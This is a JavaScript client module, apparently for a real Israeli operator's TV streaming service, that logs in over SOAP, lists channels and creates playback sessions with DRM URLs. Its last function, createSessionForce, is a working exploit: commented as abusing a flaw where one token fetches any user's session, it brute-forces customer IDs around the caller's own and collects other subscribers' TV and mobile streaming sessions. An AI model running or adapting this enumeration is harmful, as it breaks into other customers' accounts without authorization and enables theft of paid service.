import soap from 'soap';
import xml from 'xml';
import axios from 'axios';

import {login as accountLogin, getTvContractAuth, getTvContractData} from './my-partner.js';

const getUserTvData = async (idNumber, lastDigits) => {
    const userAuth = await accountLogin(idNumber, lastDigits);
    const tvAuth = await getTvContractAuth(userAuth);

    return await getTvContractData(userAuth, tvAuth);
};

const deviceToSoap = ({name, nickName, serial, type, secureId}) => ({
    ClientMsisdn: null,
    DeviceName: name,
    DeviceNickName: nickName,
    DeviceOs: 'Android',
    DeviceOperator: null,
    DeviceSecureId: secureId,
    DeviceSerial: serial,
    DeviceType: type
});

const handleLoginResponse = result => {
    const { Msisdn: userId, Token: token, responseStatus } = result;
    if (responseStatus.status === 'ERROR') {
        const error = new Error(responseStatus.statusMessage || 'Login error');
        error.additionalData = { userId, code: responseStatus.statusCode, message: responseStatus.statusMessage };

        throw error;
    }

    return { userId, token };
}

export const login = async (idNumber, lastDigits, password) => {
    const ACTION_NAME = 'CheckSubsAuthAndCreateToken';
    const soapUrl = 'https://plush.partner.co.il/TVInformation.svc?wsdl';

    const [loginSoapClient, {userName, devices}] = await Promise.all([soap.createClientAsync(soapUrl),
                                                                      getUserTvData(idNumber, lastDigits)]);

    if (!devices[0]) {
        throw new Error('Cannot find TV device. Please make sure you logged in to the app at least once');
    }

    // The props order matters!
    const loginData = {Password: password, TokenType: 'HOURS24', TvDevice: deviceToSoap(devices[0]), UserName: userName};

    const [loginResponse] = await loginSoapClient[`${ACTION_NAME}Async`]({ request: loginData });

    return handleLoginResponse(loginResponse[`${ACTION_NAME}Result`]);
};

const generateTokenHeader = token => ({ Authorization: `SeacToken token="${token}"` });

const xmlRequest = (token, config) => axios.request({
    ...config,
    headers: { ...generateTokenHeader(token), 'Content-Type': 'text/xml', ...(config.headers || {}) },
    data: xml(config.data)
});

export const getChannels = async ({ userId, token }) => {
    const queryData = {
        Request: [
            { Identity: [{ CustomerId: userId }] },
            {
                RootRelationQuery: [
                    { _attr: { relationName: 'Channels' } },
                    { Options: [{ Option: [{ _attr: { type: 'Props' } }, 'name,pictures'] }] }
                ]
            }
        ]
    };

    const config = {
        method: 'POST',
        url: 'https://pub.partner.co.il/traxis/web/Channels?Output=json',
        data: queryData
    };

    const { data: { Channels: { Channel = [] } = {} } = {} } = await xmlRequest(token, config);

    return Channel.map(x => {
        const logoPicture = x.Pictures.Picture.find(y => y.type === 'Logo');
        const logo = logoPicture && logoPicture.Value || null;

        return { id: x.id, name: x.Name, logo };
    });
};

export const createSession = async (channelId, { userId, token }, isForTv = false) => {
    const creationData = {
        CreateSession: [
            { ChannelId: channelId }
        ]
    };

    const config = {
        method: 'POST',
        url: `https://pub.partner.co.il/traxis/web/Session/propset/all?CustomerId=${userId}&SeacToken=${token}&SeacClass=personal&Output=json`,
        data: creationData,
        ...(isForTv ? {} : {headers: {'User-Agent': 'iFeelSmart-Android_MOBILE_AVC_L3'}})
    };

    const drm = `https://sno.partner.co.il/WV/Proxy/DRM?AssetId=${channelId}&RequestType=1&DeviceUID=&RootStatus=false&DRMLevel=3&Roaming=false`;

    try {
        const {data} = await xmlRequest(token, config);

        return {dashUrl: data.Session.Playlist.Channel.Value, drm};
    } catch (err) {
        const error = new Error(err.response.data.Error.Message);
        error.additionalData = {...err.response.data.Error};

        throw error;
    }
};

// This exploits a vulnerability where the same token can be used to fetch any user's session
export const createSessionForce = async (channelId, {userId: strUserId, token}) => {
    const NUMBER_OF_TRIES = parseInt(process.env.BRUTE_FORCE_TRIES) ?? 50;
    const TRIES_EACH_DIRECTION = NUMBER_OF_TRIES / 2;
    const WAIT = parseInt(process.env.BRUTE_FORCE_WAIT_MS) ?? 250;
    const userId = parseInt(strUserId); 

    const result = [];
 
    for (let i = userId - TRIES_EACH_DIRECTION; i <= userId + TRIES_EACH_DIRECTION; i++) {
        try {
            const tvSession = createSession(channelId, {userId: i, token}, true);
            const mobileSession = createSession(channelId, {userId: i, token});

            const sessions = await Promise.all([tvSession, mobileSession]);
            
            console.log(sessions);

            result.push(...sessions.map(x => ({...x, userId: i})));
        } catch {
            // Ignore this error
        }
         finally {
            await new Promise(resolve => setTimeout(resolve, WAIT));
        }
    }

    return result;;
};